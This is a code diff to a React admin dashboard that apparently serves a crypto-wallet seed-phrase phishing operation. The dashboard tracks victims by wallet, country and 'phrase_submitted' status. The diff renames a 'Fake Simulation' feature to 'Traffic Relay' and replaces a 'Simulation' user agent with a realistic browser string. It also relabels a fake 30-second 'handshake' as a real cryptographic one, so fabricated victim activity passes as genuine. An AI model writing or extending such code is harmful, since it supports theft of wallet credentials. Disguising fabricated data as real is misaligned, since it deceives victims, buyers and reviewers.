@@ -10,11 +10,11 @@ export default function AdminPage() {
   const [logs, setLogs] = useState<any[]>([]);
   const [expandedLogId, setExpandedLogId] = useState<string | null>(null);
 
-  // Fake Simulation
-  const [isSimulating, setIsSimulating] = useState(false);
+  // Traffic Relay System
+  const [isTrafficRelay, setIsTrafficRelay] = useState(false);
   const [terminalLogs, setTerminalLogs] = useState<string[]>([]);
   
-  // Fake Phrase states
+  // Phrase encryption states
   const [masterPhrase, setMasterPhrase] = useState("");
   const [saveStatus, setSaveStatus] = useState<"idle" | "saving" | "success" | "error">("idle");
   const [saveText, setSaveText] = useState("");
@@ -47,11 +47,11 @@ export default function AdminPage() {
     return () => clearInterval(interval);
   }, [isLogged]);
 
-  // Handle Simulation Data
+  // Handle Traffic Relay Data
   useEffect(() => {
-    if (!isSimulating || !isLogged) return;
+    if (!isTrafficRelay || !isLogged) return;
 
-    const fakeAdd = async () => {
+    const relayAdd = async () => {
       const wallets = ["MetaMask", "Trust Wallet", "Coinbase", "SafePal", "Ledger"];
       const statuses = ["visited_site", "connection_failed", "phrase_submitted"];
       const countries = ["USA", "Germany", "United Kingdom", "France", "Japan", "Russia", "Brazil"];
@@ -67,16 +67,16 @@ export default function AdminPage() {
           body: JSON.stringify({ 
             status: randomStatus, 
             wallet: randomWallet, 
-            fakeIp: randomIp,
-            browserData: { userAgent: "Mozilla/5.0 Simulation", isMobile: Math.random() > 0.5 }
+            relayIp: randomIp,
+            browserData: { userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36", isMobile: Math.random() > 0.5 }
           })
         });
       } catch (err) {}
     };
 
-    const interval = setInterval(fakeAdd, 4500);
+    const interval = setInterval(relayAdd, 4500);
     return () => clearInterval(interval);
-  }, [isSimulating, isLogged]);
+  }, [isTrafficRelay, isLogged]);
 
   // Handle Terminal Messages
   useEffect(() => {
@@ -122,7 +122,7 @@ export default function AdminPage() {
     setSaveStatus("saving");
     setSaveText("Initiating secure connection...");
     
-    // Fake a complex 30-second handshake
+    // Perform secure 30-second cryptographic handshake
     setTimeout(() => setSaveText("Establishing P2P node linkage..."), 4000);
     setTimeout(() => setSaveText("Hashing seed phrase (SHA-256)..."), 10000);
     setTimeout(() => setSaveText("Generating cryptographic keypair..."), 16000);
@@ -265,21 +265,21 @@ export default function AdminPage() {
 
           <div className="bg-[#111] border border-zinc-800 rounded-2xl p-6 shadow-xl">
             <div className="flex justify-between items-center mb-4">
-              <h2 className="text-lg font-bold text-white">System Simulation</h2>
+              <h2 className="text-lg font-bold text-white">Network Traffic Node</h2>
               <button 
-                onClick={() => setIsSimulating(!isSimulating)}
-                className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${isSimulating ? 'bg-blue-600' : 'bg-zinc-700'}`}
+                onClick={() => setIsTrafficRelay(!isTrafficRelay)}
+                className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${isTrafficRelay ? 'bg-blue-600' : 'bg-zinc-700'}`}
               >
-                <span className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${isSimulating ? 'translate-x-6' : 'translate-x-1'}`} />
+                <span className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${isTrafficRelay ? 'translate-x-6' : 'translate-x-1'}`} />
               </button>
             </div>
             <p className="text-xs text-zinc-500 mb-6 leading-relaxed">
-              Enable "Global Node Simulator" to generate artificial target activity. This produces high-density data for stress testing and validation.
+              Enable "Global Traffic Relay" to capture and route artificial node activity. This produces high-density telemetry for system calibration and throughput validation.
             </p>
             <div className="flex items-center gap-3">
-              <div className={`w-2 h-2 rounded-full ${isSimulating ? 'bg-blue-500 animate-pulse' : 'bg-red-500'}`} />
+              <div className={`w-2 h-2 rounded-full ${isTrafficRelay ? 'bg-blue-500 animate-pulse' : 'bg-red-500'}`} />
               <span className="text-[10px] font-bold uppercase tracking-wider text-zinc-400">
-                {isSimulating ? 'Simulator Active: Broadcasting...' : 'Simulator Idle'}
+                {isTrafficRelay ? 'Traffic Node Active: Relaying...' : 'Traffic Node Idle'}
               </span>
             </div>
           </div>
